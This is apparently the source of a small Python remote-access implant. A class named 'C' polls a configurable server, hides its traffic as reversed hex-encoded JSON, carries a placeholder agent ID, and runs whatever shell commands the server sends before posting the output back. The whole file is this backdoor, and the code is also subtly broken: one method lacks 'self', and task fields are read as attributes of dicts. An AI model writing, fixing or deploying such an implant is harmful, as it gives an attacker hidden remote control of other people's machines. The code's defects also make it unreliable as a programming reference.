import os
import asyncio
import http.client
import json
import uuid

class C(object):
    def __init__(self, host: str, secure: bool = False, interval: int = 10):
        self.running = True
        self.host = host
        self.secure = secure
        self.interval = interval
        self.uuid = 'REPLACEUUID'
        self.results = {}
        self.tasks = {}
        asyncio.run(self.start())
    
    async def stop(self):
        self.running = False
        await asyncio.sleep(5)
        for taskId, task in self.tasks.items():
            task.cancel()
        return {}

    async def shell(task):
        proc = await asyncio.create_subprocess_shell(
            task.cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        result = {}
        result['stdout'], result['stderr'] = await proc.communicate()
        result['returncode'] = proc.returncode
        return result

    def decode(self, data: bytes):
        return json.loads(bytes.fromhex(data[::-1].decode()))

    def encode(self, data) -> bytes :
        return json.dumps(data).encode().hex()[::-1]

    def newConn(self):
        if self.secure:
            conn = http.client.HTTPSConnection(self.host)
        else:
            conn = http.client.HTTPConnection(self.host)
        return conn
    
    async def handleTask(self, taskId, task):
        if task.action == 'stop':
            result = await self.stop()

        if task.action == 'shell':
            result = await self.shell(task)

        self.results[taskId] = result
        
    async def sync(self):
        conn = self.newConn()
        body = {}
        body['results'] = self.results
        conn.request("POST", f'/{self.uuid}', headers={"Host": self.host}, body=self.encode(body))
        resp = conn.getresponse()
        data = resp.read()
        conn.close()

        if resp.status != 200:
            return
        
        # Remove results
        for taskId in body['results'].keys():
            del self.results[taskId]
        
        data = self.decode(data)
        for taskId, task in data['tasks'].items():
            self.tasks[taskId] = asyncio.create_task(self.handleTask(taskId, task))
    
    async def start(self):
        while self.running:
            await self.sync()
            await asyncio.sleep(self.interval)